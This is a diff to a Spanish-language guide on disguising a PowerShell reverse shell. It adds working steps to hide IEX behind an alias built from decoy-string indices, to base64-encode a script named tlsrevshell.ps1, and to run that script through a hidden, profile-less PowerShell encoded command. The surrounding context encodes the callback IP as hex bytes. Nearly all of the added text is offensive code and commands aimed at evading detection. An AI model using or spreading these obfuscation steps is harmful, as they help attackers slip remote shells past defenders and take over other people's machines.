@@ -19,4 +19,28 @@ c0,a8,b,22
 $px = "c0","a8","b","22"
 $p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
 ```
- 
+
+**2.- Ofuscar la cadena IEX**
+
+Establecemos un alias con los valores de una cadena aleatoria, extrayendo la cadena con los índices del array:
+
+```powershell
+$x = "new-exercise"
+Set-alias $x  ($x[$true-4] + ($x[[byte]("0x" + "FF") - 263]) + $x[[byte]("0x" + "ba") - 193]) .'
+```
+Aquí otro método que he visto, pero la idea es utilizar el tuyo propio:
+```powershell
+[array]$shurmano = "I","n","t","E","r","n","e","X" ;
+set-alias new-exercise $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
+```
+
+**3.- Pasar el script de powershell a base64**
+```
+cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
+```
+
+**4.- Ejecutarlo desde consola PS **
+```
+powershell -noP -sta -w 1 -enc ENC64SCRIPT
+```
+
